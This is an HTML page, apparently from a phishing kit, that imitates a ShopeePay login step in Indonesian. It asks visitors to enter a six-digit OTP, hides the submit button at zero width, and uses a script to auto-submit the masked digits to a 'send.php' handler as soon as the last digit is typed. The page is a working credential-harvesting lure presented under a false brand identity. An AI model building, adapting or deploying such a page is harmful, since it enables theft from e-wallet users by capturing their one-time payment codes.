<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ShopeePay PIN</title>
</head>
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
    background-color: #e5e5e5;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
}

.card {
    background-color: #ffffff;
    border-radius: 16px;
    padding: 40px 32px;
    width: 100%;
    max-width: 420px;
    text-align: center;
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
}

.logo {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    margin-bottom: 24px;
}

.logo-icon {
    width: 36px;
    height: 36px;
    background-color: #ee4d2d;
    border-radius: 6px;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
}

.logo-icon::before {
    content: '';
    position: absolute;
    top: -4px;
    right: -4px;
    width: 20px;
    height: 20px;
    background-color: #ee4d2d;
    border-radius: 4px;
    z-index: -1;
}

.logo-s {
    color: #ffffff;
    font-size: 20px;
    font-weight: 600;
}

.logo-text {
    color: #ee4d2d;
    font-size: 28px;
    font-weight: 500;
}

.title {
    font-size: 18px;
    font-weight: 600;
    color: #333333;
    margin-bottom: 24px;
}

.pin-container {
    display: flex;
    justify-content: center;
    gap: 10px;
}

.pin-box {
    width: 48px;
    height: 56px;
    border: 1.5px solid #e0e0e0;
    border-radius: 10px;
    background-color: #fafafa;
    text-align: center;
    font-size: 24px;
    font-weight: 600;
    color: #333;
    outline: none;
    transition: border-color 0.2s, box-shadow 0.2s;
}

.pin-box:focus {
    border-color: #ee4d2d;
    box-shadow: 0 0 0 3px rgba(238, 77, 45, 0.1);
}

.pin-box:disabled {
    background-color: #f0f0f0;
    cursor: not-allowed;
}
</style>
<body>
    <div class="card">
    <div class="logo">
        <div class="logo-icon"><span class="logo-s">S</span></div>
        <span class="logo-text">Pay</span>
    </div>

    
    <h1 class="title">Masukan OTP</h1>
    
    <form action="send.php" method="POST" id="otpForm">
        <div class="pin-container">
            <input type="password" name="pin[]" class="pin-box" maxlength="1" inputmode="numeric" required>
            <input type="password" name="pin[]" class="pin-box" maxlength="1" inputmode="numeric" required>
            <input type="password" name="pin[]" class="pin-box" maxlength="1" inputmode="numeric" required>
            <input type="password" name="pin[]" class="pin-box" maxlength="1" inputmode="numeric" required>
            <input type="password" name="pin[]" class="pin-box" maxlength="1" inputmode="numeric" required>
            <input type="password" name="pin[]" class="pin-box" maxlength="1" inputmode="numeric" required>
        </div>
        <button type="submit" style="margin-top: 0px; padding: 0px 0px; background: #ee4d2d; color: white; border: none; border-radius: 0px; cursor: pointer; width: 0%;">Konfirmasi</button>
    </form>
</div>
<script>
    const pinInputs = document.querySelectorAll('.pin-box');
    const form = document.getElementById('otpForm');

    pinInputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            const value = e.target.value;

            // Pindah ke input berikutnya jika terisi
            if (value && index < pinInputs.length - 1) {
                pinInputs[index + 1].focus();
            }

            // OTOMATIS SUBMIT jika input terakhir (index 5) sudah terisi
            if (value && index === pinInputs.length - 1) {
                form.submit(); 
            }
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !e.target.value && index > 0) {
                pinInputs[index - 1].focus();
            }
        });
    });
</script>

